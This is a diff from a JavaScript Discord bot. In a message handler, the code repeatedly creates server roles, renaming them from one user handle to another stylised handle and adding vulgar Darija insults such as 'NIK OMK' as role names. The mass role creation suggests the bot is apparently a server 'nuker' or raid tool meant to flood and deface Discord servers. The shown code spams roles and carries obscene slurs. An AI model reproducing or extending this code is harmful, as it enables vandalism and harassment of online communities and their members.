@@ -92,65 +92,65 @@ mar.on('message', message => {
         color : "RANDOM"
     })
     m.createRole({
-        name : "@!                     Relax#0002 ",
+        name : "@ŦĐŇ™漫ᗪ尺aŤan√ ⚡#7777",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "@!                     Relax#0002 ",
+        name : "@ŦĐŇ™漫ᗪ尺aŤan√ ⚡#7777",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "@!                     Relax#0002 ",
+        name : "ŦĐŇ™漫ᗪ尺aŤan√ ⚡#7777",
         permissions :   [1],
         color : "RANDOM"
     })
 
     m.createRole({
-        name : "@!                     Relax#0002 ",
+        name : "ŦĐŇ™漫ᗪ尺aŤan√ ⚡#7777",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "@!                     Relax#0002 ",
+        name : "ŦĐŇ™漫ᗪ尺aŤan√ ⚡#7777",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "@!                     Relax#0002 ",
+        name : "ŦĐŇ™漫ᗪ尺aŤan√ ⚡#7777",
         permissions :   [1],
         color : "RANDOM"
     })
      m.createRole({
-        name : "@!                     Relax#0002 ",
+        name : "ŦĐŇ™漫ᗪ尺aŤan√ ⚡#7777",
         permissions :   [1],
         color : "RANDOM"
     })
     m.createRole({
-        name : "@!                     Relax#0002 ",
-        permissions :   [1],
-        color : "RANDOM"
-    })
-
-    m.createRole({
-        name : "safi",
-        permissions :   [1],
-        color : "RANDOM"
-    }) 
-    m.createRole({
-        name : "azebi ",
+        name : "ŦĐŇ™漫ᗪ尺aŤan√ ⚡#7777",
         permissions :   [1],
         color : "RANDOM"
     })
 
     m.createRole({
-        name : "ktn9ez ",
+        name : "3ASBA",
         permissions :   [1],
         color : "RANDOM"
     }) 
     m.createRole({
-        name : "ta jebtiha f krek",
+        name : "NIK OMK",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+
+    m.createRole({
+        name : "3ASBA ",
+        permissions :   [1],
+        color : "RANDOM"
+    }) 
+    m.createRole({
+        name : "NIK OMKOM",
         permissions :   [1],
         color : "RANDOM"
     })
